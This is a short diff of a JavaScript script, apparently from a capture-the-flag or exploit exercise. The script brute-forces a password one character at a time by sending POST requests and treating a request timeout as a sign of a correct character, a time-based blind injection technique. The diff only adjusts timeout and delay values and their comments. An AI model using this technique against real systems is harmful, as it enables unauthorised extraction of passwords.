@@ -5,7 +5,6 @@ passwd = "";
 counter = 0;
 data = new FormData();
 
-
 while(passwd.length < pass_len) {
 	for (i=0;i<charset.length;i++) {
 		(function(i) {
@@ -14,7 +13,7 @@ while(passwd.length < pass_len) {
 		xhr = new XMLHttpRequest(); // https://stackoverflow.com/a/48716403/7908040 Need new xhr request, otherwise it'll interrupt and reuse same object
 		xhr.open('POST',url,true);
 		xhr.send(data);
-		xhr.timeout = 3500; // Set timeout to 4.5 seconds
+		xhr.timeout = 3500; // Set timeout to 3.5 seconds assuming you have fast Internet
 		xhr.ontimeout = function () { 
 			console.log(`Password character found: ${charset[i]}`);
 			passwd += charset[i];
@@ -22,7 +21,7 @@ while(passwd.length < pass_len) {
 		})(i);
 
 	};
-	await new Promise(resolve => setTimeout(resolve, 5000)); // 15 sec
+	await new Promise(resolve => setTimeout(resolve, 4000)); // 4 sec
 	// https://stackoverflow.com/a/51482993/7908040 Can only make it work with long delays
 }
 
